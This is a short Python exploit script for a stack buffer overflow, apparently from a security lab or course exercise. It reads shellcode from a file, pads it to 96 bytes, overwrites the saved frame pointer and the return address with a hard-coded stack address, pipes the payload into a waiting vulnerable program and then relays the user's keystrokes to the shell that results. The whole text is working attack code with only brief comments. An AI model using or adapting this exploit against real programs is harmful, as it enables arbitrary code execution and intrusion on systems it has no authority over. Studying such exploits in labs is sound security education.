#!/usr/bin/env python3
from struct import *
import sys, os

# We want buffer to first hold the shellcode
shellfile = open("shellcode.bin", "rb")
shellcode = shellfile.read()


buf = shellcode
buf += b"A"*(96-len(shellcode))
buf += b"BBBBBBBB"
buf += pack("<Q", 0x7fffffffecc0)

# write the shell code out to the waiting vulnerable program
fp = os.fdopen(sys.stdout.fileno(), 'wb')
fp.write(buf)
fp.flush()

# forward user's input to the underlying program
while True:
    try:
        data = sys.stdin.buffer.read1(1024)
        if not data:
            break
        fp.write(data)
        fp.flush()
    except KeyboardInterrupt:
        break
